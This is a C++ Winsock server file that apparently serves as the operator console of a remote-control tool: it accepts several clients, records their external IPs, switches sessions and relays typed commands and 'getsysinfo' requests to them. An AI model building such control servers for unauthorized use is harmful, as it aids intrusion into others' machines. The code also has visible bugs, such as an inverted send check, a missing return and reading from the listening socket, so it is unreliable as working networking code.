#include "Server.h"
#pragma warning(disable:4996) 
#include <thread>
#include <mutex>
#include <iostream>
#include "Scripts_s.h"

Server::Server(const int pPort) : port(pPort), Socket_()
{
	this->setSock(socket(AF_INET, SOCK_STREAM, IPPROTO_TCP));
	sockaddr_in addr;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	
	if (*(this->getSock()) == INVALID_SOCKET)
	{
		std::cout << "Erreur initialisation socket : " << WSAGetLastError();
		this->setError(1);
	}
	
	int res = bind(*this->getSock(), (sockaddr*)&addr, sizeof(addr));
	if (res != 0)
	{
		std::cout << "Error bind : " << WSAGetLastError();
		this->setError(1);
	}
	res = listen(*this->getSock(), SOMAXCONN);
	if (res != 0)
	{
		std::cout << "Error listen : " << WSAGetLastError();
		this->setError(1);
	}

	std::cout << "Server started on :  " << port << std::endl;
}
Server::~Server() 
{
	for (int i = 0; i < clients.size(); i++)
	{
		closesocket(clients[i].sock);
	}
}

bool Server::send_c()
{
	
	char b[256] = { 0 };
	std::cout << ">> ";
	std::cin.getline(b, sizeof(b));	

	if (!(strcmp(b, "exit")) || !(strcmp(b, "EXIT"))) 
	{
		exit = 1;
		return 0;
	}
	else if (strcmp(b, "help") == 0 || strcmp(b, "HELP") == 0)
	{
		Info::print_help();
	}
	else if (!(strcmp(b, "list")))
	{
		Info::list(this);		
	}
	else if (!(strcmp(b, "list_scripts")))
	{
		Info::list_scripts();
	}
	else if (!(strcmp(b, "set_session")))
	{
		Info::set_session(this);
	}
	else if (!(strcmp(b, "getsysinfo")))
	{
		Info::getsysinfo(this);
	}
	else if (!(this->send_b(b))) { return 1; }
	else { return 0; }
}

bool Server::send_b(const char* pbuffer)
{
	if(send(default_client.sock, pbuffer, SIZE_BUFFER, 0) == 0)
		return 1;
	else
		return 0;
}
bool Server::send_b(const int &pbuffer)
{
	std::string s = std::to_string(pbuffer);
	if (send(default_client.sock, s.c_str(), SIZE_BUFFER, 0) == 0)
		return 1;
	else return 0;
}

bool Server::acceptClient()
{
	st_Client NewClient;
	sockaddr_in addr;
	addr.sin_addr.s_addr = INADDR_ANY; // indique que toutes les sources seront acceptées
	addr.sin_port = htons(port); // toujours penser à traduire le port en réseau
	addr.sin_family = AF_INET;
	sockaddr_in from = { 0 };
	socklen_t addrlen = sizeof(addr);
	SOCKET newClient = accept(*this->getSock(), (SOCKADDR*)(&from), &addrlen);

	if (newClient != INVALID_SOCKET)
	{
		char buffer[256];
		char buff[INET6_ADDRSTRLEN] = { 0 };
		std::string clientAddress = inet_ntop(addr.sin_family, (void*)&(addr.sin_addr), buff, INET6_ADDRSTRLEN);
		std::cout << "New client accepted :  " << clientAddress.c_str() << ":" << addr.sin_port << std::endl;
		NewClient.sock = newClient;
		NewClient.addr = clientAddress;
		NewClient.number = (clients.size()+1);
		// IP
		recv(newClient, buffer, sizeof(buffer), 0);

		NewClient.ip_extern = buffer;
		clients.push_back(NewClient);

		if (clients.size() == 1) 
		{
			default_client = NewClient;
		}
		return 1;
		
	}
	else
	{
		//std::cout << "Error .." << std::endl;
		return 0;
	}
}

std::vector<st_Client> Server::getClients(){return clients;}
bool Server::getExit() { return exit; }
void Server::setDefaultClient(st_Client _default)
{
	default_client = _default;
}

bool Server::recv_b()
{
	char b[SIZE_BUFFER] = { 0 };
	if ((recv(*this->getSock(), b, sizeof(b), 0) >= 0))
	{
		this->setBuffer(b);
		Sleep(300);
		return 1;
	}
	else
		return 0;
}
